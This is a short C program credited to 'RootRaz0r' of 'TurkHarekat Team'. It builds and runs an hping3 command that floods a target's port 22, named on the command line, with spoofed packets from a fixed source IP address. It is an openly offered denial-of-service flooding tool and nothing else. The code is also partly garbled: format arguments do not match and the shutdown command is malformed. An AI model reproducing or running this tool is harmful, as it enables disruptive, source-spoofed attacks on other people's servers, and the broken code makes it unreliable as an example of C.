//RootRaz0r.


#include <stdio.h>
#define yesil  "\x1b[92m"
#define kirmizi "\033[0;31m"
#define mavi "\033[0;36m"
#define sari  "\x1B[33m"
int main(int argc, char **argv[]){
 
char aktifet[255];
printf("%s• •        Kodlama: RootRaz0r • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
printf("%s• •        TurkHarekat Team     • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
sprintf(aktifet,"hping3 -H -0 -A --spoof 128.65.210.118 %s -p 22 -d 50 -e 'Turkharekat Team' --flood",argv[1], argv[1]);
system(aktifet);
 
char sonlandir[255];
sprintf(sonlandir,"sleep %s && screen 0 hping3 x quit %s %s",argv[3]);
system(sonlandir);
 
}
